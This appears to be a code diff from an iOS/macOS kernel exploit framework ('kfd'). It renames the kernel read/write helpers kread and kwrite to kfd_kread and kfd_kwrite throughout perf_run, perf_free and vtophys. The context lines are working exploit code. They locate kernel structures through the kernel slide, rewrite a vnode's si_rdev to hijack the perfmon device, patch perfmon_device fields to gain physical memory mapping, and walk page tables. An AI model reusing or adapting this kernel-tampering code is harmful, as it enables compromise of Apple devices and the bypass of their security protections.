@@ -97,10 +97,10 @@ void perf_run(struct kfd* kfd)
     u64 fd_ofiles = dynamic_kget(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
     u64 fileproc_kaddr = UNSIGN_PTR(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
     u64 fileproc = 0;
-    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
+    kfd_kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
     u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
     u64 fp_glob = 0;
-    kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
+    kfd_kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
     u64 fg_ops = static_kget(struct fileglob, fg_ops, UNSIGN_PTR(fp_glob));
     u64 fo_kqfilter =  static_kget(struct fileops, fo_kqfilter, UNSIGN_PTR(fg_ops));
     u64 vn_kqfilter = UNSIGN_PTR(fo_kqfilter);
@@ -123,7 +123,7 @@ void perf_run(struct kfd* kfd)
     u64 fg_data = static_kget(struct fileglob, fg_data, UNSIGN_PTR(fp_glob));
     u64 v_specinfo = static_kget(struct vnode, v_un.vu_specinfo, UNSIGN_PTR(fg_data));
     kfd->perf.dev.si_rdev_kaddr = UNSIGN_PTR(v_specinfo) + offsetof(struct specinfo, si_rdev);
-    kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
+    kfd_kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
 
     u64 cdevsw_kaddr = dynamic_info(kernelcache__cdevsw) + kernel_slide;
     u64 perfmon_dev_open_kaddr = dynamic_info(kernelcache__perfmon_dev_open) + kernel_slide;
@@ -131,7 +131,7 @@ void perf_run(struct kfd* kfd)
     u32 dev_new_major = 0;
     for (u64 dmaj = 0; dmaj < 64; dmaj++) {
         u64 kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
-        kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
+        kfd_kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
         u64 d_open = UNSIGN_PTR(cdevsw[0]);
         if (d_open == perfmon_dev_open_kaddr) {
             dev_new_major = (dmaj << 24);
@@ -142,24 +142,24 @@ void perf_run(struct kfd* kfd)
     u32 new_si_rdev_buffer[2] = {};
     new_si_rdev_buffer[0] = dev_new_major;
     new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
-    kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));
+    kfd_kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));
 
     /*
      * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
      */
     u64 ptov_table_kaddr = dynamic_info(kernelcache__ptov_table) + kernel_slide;
-    kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));
+    kfd_kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));
 
     u64 gVirtBase_kaddr = dynamic_info(kernelcache__gVirtBase) + kernel_slide;
-    kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
+    kfd_kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
     print_x64(kfd->perf.gVirtBase);
 
     u64 gPhysBase_kaddr = dynamic_info(kernelcache__gPhysBase) + kernel_slide;
-    kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
+    kfd_kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
     print_x64(kfd->perf.gPhysBase);
 
     u64 gPhysSize_kaddr = dynamic_info(kernelcache__gPhysSize) + kernel_slide;
-    kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
+    kfd_kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
     print_x64(kfd->perf.gPhysSize);
 
     assert(kfd->info.kaddr.current_pmap);
@@ -186,19 +186,19 @@ void perf_run(struct kfd* kfd)
     struct perfmon_device perfmon_device = {};
     u64 perfmon_device_kaddr = dynamic_info(kernelcache__perfmon_devices) + kernel_slide;
     u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
-    kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
+    kfd_kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
 
     perfmon_device.pmdv_mutex[1] = (-1);
     perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
     perfmon_device.pmdv_allocated = true;
 
-    kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
+    kfd_kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
     ((volatile u32*)(perfmon_device_uaddr))[4] = 0;
-    kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
+    kfd_kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
     ((volatile u32*)(perfmon_device_uaddr))[5] = 0;
-    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
-    kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
-    kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));
+    kfd_kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
+    kfd_kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
+    kfd_kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));
 
     kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
     kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
@@ -220,7 +220,7 @@ void perf_free(struct kfd* kfd)
      * Then, close it and deallocate the shared page.
      * This leaves the first perfmon device "pmdv_allocated", which is fine.
      */
-    kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
+    kfd_kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
     assert_bsd(close(kfd->perf.dev.fd));
     assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
 }
@@ -303,7 +303,7 @@ u64 vtophys(struct kfd* kfd, u64 va)
         u64 tte_index = (va & index_mask) >> shift;
         u64 tte_kaddr = tt_kaddr + (tte_index * sizeof(u64));
         u64 tte = 0;
-        kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));
+        kfd_kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));
 
         if ((tte & valid_mask) != valid_mask) {
             return 0;
